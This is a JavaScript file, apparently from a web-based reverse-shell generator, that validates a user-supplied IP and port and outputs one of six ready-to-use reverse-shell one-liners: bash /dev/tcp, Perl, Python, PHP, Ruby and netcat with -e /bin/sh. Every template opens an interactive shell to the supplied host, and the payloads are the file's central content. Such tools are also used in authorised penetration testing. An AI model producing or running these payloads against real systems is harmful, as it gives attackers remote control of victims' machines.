function get_values() {
    //all html elements
    var ip_input = document.getElementById("ip-number");
    var port_input = document.getElementById("port-number");
    var result = document.getElementById("result");
    var select_input = document.getElementById("selector-options");

    //getting the values
    var ip = ip_input.value;
    var port = port_input.value;
    var select = select_input.value;

    //check if the IP is valid
    function checkIP(ip_arg) {
        var patron = /^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
        return patron.test(ip_arg);
    }

    //function to create the payload
    function generate_payload(ip_arg,port_arg,select_arg){
        var payload;

        switch (select_arg) {
            case "option1":
              payload = `bash -i >& /dev/tcp/${ip_arg}/${port_arg} 0>&1`;
              break;
            case "option2":
              payload = `perl -e 'use Socket;$i="${ip_arg}";$p=${port_arg};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
              break;
            case "option3":
              payload = `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip_arg}",${port_arg}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`;
              break;
            case "option4":
              payload = `php -r '$sock=fsockopen("${ip_arg}",${port_arg});exec("/bin/sh -i <&3 >&3 2>&3");'`;
              break;
            case "option5":
              payload = `ruby -rsocket -e'f=TCPSocket.open("${ip_arg}",${port_arg}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`;
              break;
            case "option6":
              payload = `nc -e /bin/sh ${ip_arg} ${port_arg}`;
              break;
            default:
              console.log("I don't know what to put here :D");
              break;
        }
      
        return payload;
    }    
    
    if ( ip === "" || port === "") {
        result.innerHTML = "The input should not be empty..."
    } else {
        if (parseInt(port) <= 0) {
            result.innerHTML = "The port number can't be 0 or less than 0";
        } else if (parseInt(port) > 65535) {
            result.innerHTML = "Bruh, there's only 64535 ports";
        } else {
            if (checkIP(ip) === true) {
                result.innerHTML = generate_payload(ip,port,select);
            } else {
                result.innerHTML = "The IP address is NOT valid";
            }
            
        }
    }
}